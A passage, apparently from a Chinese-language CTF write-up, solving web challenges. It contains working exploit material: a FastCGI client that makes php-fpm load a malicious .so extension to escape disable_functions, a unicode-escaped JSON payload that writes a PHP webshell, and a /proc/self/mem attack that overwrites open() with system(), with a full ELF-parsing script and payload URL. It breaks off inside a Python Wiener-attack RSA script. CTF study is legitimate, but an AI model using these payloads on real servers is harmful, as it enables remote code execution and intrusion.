; else &#123; /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */ $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF); &#125; /* nameData &amp; valueData */ return $nvpair . $name . $value; &#125; protected function readNvpair($data, $length = null) &#123; if ($length === null) &#123; $length = strlen($data); &#125; $array = array(); $p = 0; while ($p != $length) &#123; $nlen = ord($data&#123;$p++&#125;); if ($nlen &gt;= 128) &#123; $nlen = ($nlen &amp; 0x7F &lt;&lt; 24); $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16); $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8); $nlen |= (ord($data&#123;$p++&#125;)); &#125; $vlen = ord($data&#123;$p++&#125;); if ($vlen &gt;= 128) &#123; $vlen = ($nlen &amp; 0x7F &lt;&lt; 24); $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16); $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8); $vlen |= (ord($data&#123;$p++&#125;)); &#125; $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen); $p += ($nlen + $vlen); &#125; return $array; &#125; public function buildAllPacket(array $params, $stdin) &#123; // Ensure new requestID is not already being tracked do &#123; $this-&gt;_requestCounter++; if ($this-&gt;_requestCounter &gt;= 65536 /* or (1 &lt;&lt; 16) */) &#123; $this-&gt;_requestCounter = 1; &#125; $id = $this-&gt;_requestCounter; &#125; while (isset($this-&gt;_requests[$id])); $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;keepAlive) . str_repeat(chr(0), 5), $id); $paramsRequest = &#x27;&#x27;; foreach ($params as $key =&gt; $value) &#123; $paramsRequest .= $this-&gt;buildNvpair($key, $value, $id); &#125; if ($paramsRequest) &#123; $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest, $id); &#125; $request .= $this-&gt;buildPacket(self::PARAMS, &#x27;&#x27;, $id); if ($stdin) &#123; $request .= $this-&gt;buildPacket(self::STDIN, $stdin, $id); &#125; $request .= $this-&gt;buildPacket(self::STDIN, &#x27;&#x27;, $id); return $request; &#125;&#125;$sock = stream_socket_client(&quot;unix:///tmp/php-cgi-74.sock&quot;, $errno, $errstr);$client = new Client();$payload_file = &quot;/www/wwwroot/10.20.124.208/sandbox/g4e0iupg8df1gombtbs2pkadl1/upload/1.php&quot;;$params = array( &#x27;REQUEST_METHOD&#x27; =&gt; &#x27;GET&#x27;, &#x27;SCRIPT_FILENAME&#x27; =&gt; $payload_file, &#x27;PHP_ADMIN_VALUE&#x27; =&gt; &quot;extension_dir = /tmp
extension = mb.so&quot;, //这里$payload_file。是我们调用恶意so执行的php命令。extension_dir是扩展目录extension是扩展名);$data = $client-&gt;buildAllPacket($params, &#x27;&#x27;);fwrite($sock, $data);var_dump(fread($sock, 4096));antsystem(&#x27;/readflag&#x27;);?&gt; 将https://github.com/AntSwordProject/ant_php_extension 编译成so文件上传到/tmp 注意php版本要一样 kali安装phpsize 1apt install php7.4-dev 这样我们就有个antsystem函数可以用来执行命令了 Easyjson源码： 123456789101112131415161718192021222324252627282930313233343536&lt;?phpinclude &#x27;security.php&#x27;;if(!isset($_GET[&#x27;source&#x27;]))&#123; show_source(__FILE__); die();&#125;$sandbox = &#x27;sandbox/&#x27;.sha1($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]).&#x27;/&#x27;;var_dump($sandbox);if(!file_exists($sandbox))&#123; mkdir($sandbox); file_put_contents($sandbox.&quot;index.php&quot;,&quot;&lt;?php echo &#x27;Welcome To Dbapp OSS.&#x27;;?&gt;&quot;);&#125;$action = $_GET[&#x27;action&#x27;];$content = file_get_contents(&quot;php://input&quot;);if($action == &quot;write&quot; &amp;&amp; SecurityCheck(&#x27;filename&#x27;,$_GET[&#x27;filename&#x27;]) &amp;&amp;SecurityCheck(&#x27;content&#x27;,$content))&#123; $content = json_decode($content); $filename = $_GET[&#x27;filename&#x27;]; $filecontent = $content-&gt;content; $filename = $sandbox.$filename; file_put_contents($filename,$filecontent.&quot;
 Powered By Dbapp OSS.&quot;);&#125;elseif($action == &quot;reset&quot;)&#123; $files = scandir($sandbox); foreach($files as $file) &#123; if(!is_dir($file))&#123; if($file !== &quot;index.php&quot;)&#123; unlink($sandbox.$file); &#125; &#125; &#125;&#125;else&#123; die(&#x27;Security Check Failed.&#x27;);&#125; 直接unicode编码绕过: unicode部分是： 1&#123;&quot;content&quot;:&quot;&lt;?php system(&#39;&#x2F;readflag&#39;);?&gt;&quot;&#125; getshell后没什么限制直接拿flag了 Flagshop抓包会发现一个任意文件读取 php伪协议读源码 123456789101112131415// backend.php?readfile=php://filter/convert.base64-encode/resource=backend.php&lt;?php$offset = isset($_GET[&#x27;offset&#x27;]) ? $_GET[&#x27;offset&#x27;] : 0;$buffer = isset($_GET[&#x27;buffer&#x27;]) ? $_GET[&#x27;buffer&#x27;] : &quot;&quot;;if (isset($_GET[&#x27;writefile&#x27;])) &#123; $fp = fopen($_GET[&#x27;writefile&#x27;], &quot;a&quot;); fseek($fp, $offset); fwrite($fp, $buffer); fclose($fp);&#125;if (isset($_GET[&#x27;readfile&#x27;])) &#123; echo file_get_contents($_GET[&#x27;readfile&#x27;]);&#125; 这题是读内存 写内存 linux万物皆是文件 webpwn：https://github.com/beched/php_disable_functions_bypass 读/proc/self/maps 该文件包含了当前进程映射的内存区域以及它们的访问权限 查看动态链接库的位置 1strings maps | grep &quot;libc-&quot; 并记录libc的地址 接着读/lib/x86_64-linux-gnu/libc-2.19.so 并查看system函数的地址 动态链接库的地址加上system的偏移就能计算出system函数的地址。 1234&lt;?phpecho dechex(0x7ffff5f40000+0x0000000000046590);// 0x7ffff5f86590?&gt; 计算open函数的偏移 需要/proc/pid/exe文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?phpfunction packlli($value) &#123; $higher = ($value &amp; 0xffffffff00000000) &gt;&gt; 32; $lower = $value &amp; 0x00000000ffffffff; return pack(&#x27;V2&#x27;, $lower, $higher);&#125;function unp($value) &#123; return hexdec(bin2hex(strrev($value)));&#125;function parseelf($bin_ver, $rela = false) &#123; $bin = file_get_contents($bin_ver); $e_shoff = unp(substr($bin, 0x28, 8)); $e_shentsize = unp(substr($bin, 0x3a, 2)); $e_shnum = unp(substr($bin, 0x3c, 2)); $e_shstrndx = unp(substr($bin, 0x3e, 2)); for($i = 0; $i &lt; $e_shnum; $i += 1) &#123; $sh_type = unp(substr($bin, $e_shoff + $i * $e_shentsize + 4, 4)); if($sh_type == 11) &#123; // SHT_DYNSYM $dynsym_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8)); $dynsym_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); $dynsym_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8)); &#125; elseif(!isset($strtab_off) &amp;&amp; $sh_type == 3) &#123; // SHT_STRTAB $strtab_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8)); $strtab_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); &#125; elseif($rela &amp;&amp; $sh_type == 4) &#123; // SHT_RELA $relaplt_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8)); $relaplt_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); $relaplt_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8)); &#125; &#125; if($rela) &#123; for($i = $relaplt_off; $i &lt; $relaplt_off + $relaplt_size; $i += $relaplt_entsize) &#123; $r_offset = unp(substr($bin, $i, 8)); $r_info = unp(substr($bin, $i + 8, 8)) &gt;&gt; 32; $name_off = unp(substr($bin, $dynsym_off + $r_info * $dynsym_entsize, 4)); $name = &#x27;&#x27;; $j = $strtab_off + $name_off - 1; while($bin[++$j] != &quot;\0&quot;) &#123; $name .= $bin[$j]; &#125; if($name == &#x27;open&#x27;) &#123; return $r_offset; &#125; &#125; &#125; else &#123; for($i = $dynsym_off; $i &lt; $dynsym_off + $dynsym_size; $i += $dynsym_entsize) &#123; $name_off = unp(substr($bin, $i, 4)); $name = &#x27;&#x27;; $j = $strtab_off + $name_off - 1; while($bin[++$j] != &quot;\0&quot;) &#123; $name .= $bin[$j]; &#125; if($name == &#x27;__libc_system&#x27;) &#123; $system_offset = unp(substr($bin, $i + 8, 8)); &#125; if($name == &#x27;__open&#x27;) &#123; $open_offset = unp(substr($bin, $i + 8, 8)); &#125; &#125; return array($system_offset, $open_offset); &#125;&#125;$open_php = parseelf(&#x27;exe&#x27;, true);echo $open_php;//结果：15333784?&gt; /proc/self/mem文件是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。该文件不能直接读取，需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。 我们知道system函数的地址，我们就可以将open函数的地址替换为system函数的地址，我们在file_get_contents传入参数为系统命令实际执行的却是system函数，将readflag的结果输出到文件。 构造payload: 1backend.php?readfile&#x3D;&#x2F;readflag&gt;&#x2F;tmp&#x2F;mb&amp;writefile&#x3D;&#x2F;proc&#x2F;self&#x2F;mem&amp;buffer&#x3D;%90%65%f8%f5%ff%7f&amp;offset&#x3D;15333784 捋下思路 向/proc/self/mem文件即内存 open函数(file_get_contents会调用该方法)的地址位置写入system的地址 从而实现调用file_get_contents函数调用system函数的作用 cryptoBrokenSystems维纳攻击得到d 根据d求p q 生成私钥解密加密文件 exp:  Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_OAEPimport osimport gmpy2from Crypto.Util.number import *import random import syssys.setrecursionlimit(1000000)def rational_to_contfrac (x, y): &#x27;&#x27;&#x27; Converts a rational x/y fraction into a list of partial quotients [a0, ..., an] &#x27;&#x27;&#x27; a = x//y if a * y == x: return [a] else: pquotients = rational_to_contfrac(y, x - a * y) pquotients.insert(0, a) return pquotientsdef convergents_from_contfrac(frac): &#x27;&#x27;&#x27; computes the list of convergents using the list of partial quotients &#x27;&#x27;&#x27; convs = []; for i in range(len(frac)): convs.append(contfrac_to_rational(frac[0:i])) return convsdef contfrac_to_rational (frac): &#x27;&#x27;&#x27;Converts a finite continued fraction [a0, ..., an] to an x/y rational. &#x27;&#x27;&#x27; if len(frac) == 0: return (0,1) elif len(frac) == 1: return (frac[0], 1) else: remainder = frac[1:len(frac)] (num, denom) = contfrac_to_rational(remainder) # fraction is now frac[0] + 1/(num/denom), which is # frac[0] + denom/num. return (frac[0] * num + denom, num)def egcd(a,b): &#x27;&#x27;&#x27; Extended Euclidean Algorithm returns x, y, gcd(a,b) such that ax + by = gcd(a,b) &#x27;&#x27;&#x27; u, u1 = 1, 0 v, v1 = 0, 1 while b: q = a // b u, u1 = u1, u - q * u1 v, v1 = v1, v - q * v1 a, b = b, a - q * b return u, v, adef gcd(a,b): &#x27;&#x27;&#x27; 2.